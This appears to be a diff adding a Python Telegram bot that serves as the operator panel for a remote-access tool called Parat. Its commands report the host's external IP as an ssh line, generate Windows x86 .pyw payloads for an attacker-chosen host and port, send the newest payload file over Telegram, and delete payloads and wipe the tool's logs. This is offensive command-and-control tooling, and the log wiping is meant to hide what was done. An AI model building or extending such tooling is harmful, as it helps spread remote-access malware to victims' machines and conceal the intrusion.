@@ -1,0 +1,178 @@
+#!/bin/env python
+
+import glob
+import getpass
+import os
+import urllib
+import telegram
+from telegram.ext import Updater, CommandHandler
+# from client import MakeOutput
+from random import choice
+from string import ascii_uppercase, ascii_lowercase, digits
+
+
+
+updater = Updater('YOUR_BOT_TOKEN')
+
+
+def SayHello(bot, update):
+    chat_id = update.message.chat_id
+    bot.send_message(chat_id=chat_id, text='Hello my friend ;)')
+
+
+
+def SSH(bot, update):
+    chat_id = update.message.chat_id
+    user = getpass.getuser()
+    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me', 'ipecho.net/plain', 'myexternalip.com/raw' ]
+    ip = ''
+    for url in ex_ip_grab:
+        try: ip = urllib.urlopen('http://'+url).read().rstrip()
+        except IOError: pass
+        if ip and (6 < len(ip) < 16): break
+    port = 22
+    bot.send_message(
+                    chat_id=chat_id,
+                    text='`ssh -p {} {}@{}`'.format(port, user, ip),
+                    parse_mode=telegram.ParseMode.MARKDOWN
+                    )
+
+
+
+def GenServer(bot , update):
+    chat_id = update.message.chat_id
+    args = update.message.text.split()
+
+    if update.message.text.strip() == "/generate":
+        bot.send_message(
+                        chat_id=chat_id,
+                        text="usage: `/generate host port [name]`",
+                        parse_mode=telegram.ParseMode.MARKDOWN
+                        )
+    else:
+
+        try:
+            host = args[1]
+            port = int(args[2])
+            plat = 'windows'
+            arch = 'x86'
+
+            try:
+                name = args[3]
+                file_type = name.split('.')[-1:]
+                file_name = '.'.join(name.split('.')[:-1])
+
+                if file_type not in ['py', 'pyw']:
+                    file_name = name
+
+                if file_type and not file_name:
+                    file_name = "".join(file_type)
+                    file_type = "py"
+
+                if file_type != "pyw":
+                    name = '.'.join([file_name, "pyw"])
+                output = name
+            except:
+                random_string = ''.join(choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(6))
+                output = "Parat-x86_" + random_string + ".pyw"
+
+            path = os.path.abspath('')
+            # MakeOutput(output, host, port, plat, arch, None, path)
+            msg  = "`%s` Created:\n"    % output
+            msg += "  host: `%s`\n"     % host
+            msg += "  port: `%s`\n"     % port
+            msg += "  platform: `%s`\n" % plat
+            msg += "  arch: `%s`\n"     % arch
+
+            bot.send_message(
+                chat_id=chat_id,
+                text=msg,
+                parse_mode=telegram.ParseMode.MARKDOWN
+            )
+
+        except Exception as e:
+            bot.send_message(chat_id=chat_id, text=str(e))
+
+
+def SendServer(bot , update):
+    chat_id = update.message.chat_id
+    newest_server = max(glob.iglob('parat_output/*.[Pp][Yy][Ww]'), key=os.path.getctime)
+    server_file = open(newest_server, 'rb')
+    bot.send_document(chat_id=chat_id, document=server_file)
+
+
+
+def SendLog(bot, update):
+
+    chat_id = update.message.chat_id
+    os.chdir(os.path.join('conf', 'logs'))
+
+    try:
+
+        today_log = max(glob.iglob('*.log'), key=os.path.getctime)
+        log_file = open(today_log, 'rb')
+        bot.send_document(chat_id=chat_id, document=log_file)
+        log_file.close()
+
+    except Exception as e:
+
+        if "max() arg is an empty sequence" in e:
+            bot.send_message(chat_id=chat_id, text="No log found today!")
+        else:
+            bot.send_message(chat_id=chat_id, text=str(e))
+
+    os.chdir(os.path.join('../..'))
+
+
+
+def CleanFolder(bot, update):
+
+    chat_id = update.message.chat_id
+    names = []
+
+    for server_file in glob.glob("*.[Pp][Yy][Ww]"):
+        names.append(server_file)
+        os.remove(server_file)
+
+    if len(names) > 0:
+        bot.send_message(
+                        chat_id=chat_id,
+                        text='All file(s) deleted successfully:\n`{}`'.format('\n'.join(names)),
+                        parse_mode=telegram.ParseMode.MARKDOWN
+                        )
+
+
+def CleanLogs(bot, update):
+
+    chat_id = update.message.chat_id
+    PathToLogFile = os.path.join('conf', 'logs', 'parat.log')
+    with open(PathToLogFile, "w") as rlog: rlog.close()
+    bot.send_message(chat_id=chat_id, text='All logs deleted successfully.')
+
+
+
+
+say_hello = CommandHandler('start', SayHello)
+updater.dispatcher.add_handler(say_hello)
+
+ssh = CommandHandler('ssh', SSH)
+updater.dispatcher.add_handler(ssh)
+
+gen_server = CommandHandler('generate', GenServer)
+updater.dispatcher.add_handler(gen_server)
+
+send_server = CommandHandler('get_server', SendServer)
+updater.dispatcher.add_handler(send_server)
+
+send_log = CommandHandler('get_logs', SendLog)
+updater.dispatcher.add_handler(send_log)
+
+clean_folder = CommandHandler('clean_servers', CleanFolder)
+updater.dispatcher.add_handler(clean_folder)
+
+clean_logs = CommandHandler('clean_logs', CleanLogs)
+updater.dispatcher.add_handler(clean_logs)
+
+
+updater.start_polling()
+updater.idle()
